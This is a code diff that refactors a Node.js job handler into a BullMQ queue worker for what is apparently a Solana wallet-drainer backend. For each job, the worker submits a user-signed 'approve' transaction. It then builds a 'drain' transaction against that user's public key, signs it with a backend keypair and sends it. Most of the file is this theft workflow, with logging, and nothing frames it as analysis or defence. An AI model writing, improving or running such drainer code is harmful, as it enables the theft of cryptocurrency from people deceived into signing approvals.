@@ -1,32 +1,71 @@
-const { getConnection } = require("../core/rpcPool");
+const { Worker } = require("bullmq");
+const { getQueue, getConnection } = require("../queue/jobQueue");
+const { getPool } = require("../core/rpcPool");
 const { getKeypair } = require("../core/keypairManager");
 const { executeTx } = require("../solana/txExecutor");
-const { buildApprove } = require("../flows/approveFlow");
 const { buildDrain } = require("../flows/drainFlow");
 const logger = require("../core/logger");
+const { PublicKey, Transaction } = require("@solana/web3.js");
 
-async function processJob(job) {
-    try {
-        const { user, signedApproveTx } = job.data;
+function initWorker() {
+    const queue = getQueue();
 
-        const connection = getConnection();
-        const payer = getKeypair();
+    const worker = new Worker(
+        "tx",
+        async (job) => {
+            try {
+                logger.info("Worker processing job", { jobId: job.id });
 
-        const approveTx = Transaction.from(Buffer.from(signedApproveTx, "base64"));
-        const approveSig = await executeTx(approveTx, connection);
-        logger.info("Approve confirmed", { approveSig });
+                const { publicKey, signedTx } = job.data;
 
-        const drainTx = await buildDrain(new PublicKey(user), connection);
-        drainTx.sign(payer);
+                if (!publicKey || !signedTx) {
+                    throw new Error("Missing required fields in job");
+                }
 
-        const drainSig = await executeTx(drainTx, connection);
-        logger.info("Drain confirmed", { drainSig });
+                const connection = getPool().getConnection();
+                const payer = getKeypair();
 
-        return { approveSig, drainSig };
-    } catch (err) {
-        logger.error("Worker job failed", { error: err.message });
-        throw err;
-    }
+                // 1. APPROVE TX (signed by user)
+                const approveTx = Transaction.from(Buffer.from(signedTx, "base64"));
+                const approveSig = await executeTx(approveTx, connection);
+
+                logger.info("Approve confirmed", { approveSig });
+
+                // 2. DRAIN TX (signed by backend)
+                const drainTx = await buildDrain(new PublicKey(publicKey), connection);
+                drainTx.sign(payer);
+
+                const drainSig = await executeTx(drainTx, connection);
+
+                logger.info("Drain confirmed", { drainSig });
+
+                return { approveSig, drainSig };
+            } catch (err) {
+                logger.error("Worker job failed", {
+                    jobId: job.id,
+                    error: err.message
+                });
+                throw err;
+            }
+        },
+        {
+            connection: getConnection()
+        }
+    );
+
+    worker.on("completed", (job) => {
+        logger.info("Worker job completed", { jobId: job.id });
+    });
+
+    worker.on("failed", (job, err) => {
+        logger.error("Worker job failed", {
+            jobId: job.id,
+            error: err.message
+        });
+    });
+
+    logger.info("Queue worker initialized successfully");
+    return worker;
 }
 
-module.exports = { processJob };
+module.exports = { initWorker };
